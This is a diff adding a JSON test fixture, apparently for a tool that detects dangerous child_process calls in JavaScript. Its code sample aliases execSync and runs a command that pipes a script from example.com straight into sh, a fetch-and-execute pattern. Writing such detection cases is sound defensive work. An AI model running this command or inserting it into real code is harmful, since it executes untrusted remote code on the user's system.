@@ -1,0 +1,4 @@
+{
+  "name": "execSync via destructured alias with a curl command",
+  "code": "const { execSync: run } = require(\"child_process\");\nrun(\"curl http://example.com/x.sh | sh\");\n"
+}
